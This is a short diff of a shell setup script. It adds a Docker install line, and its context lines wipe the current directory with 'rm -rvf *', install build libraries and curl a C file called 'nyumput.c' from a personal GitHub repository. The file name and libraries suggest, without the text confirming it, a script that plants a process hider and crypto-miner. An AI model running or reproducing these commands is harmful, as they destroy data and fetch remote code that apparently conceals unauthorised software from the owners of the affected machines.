@@ -1,5 +1,6 @@
 rm -rvf * && mkdir a && cd a
 #apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+apt install docker.io -y
 apt install curl libssl1.0-dev
 apt install libjansson-dev libjansson4 -y
 curl https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
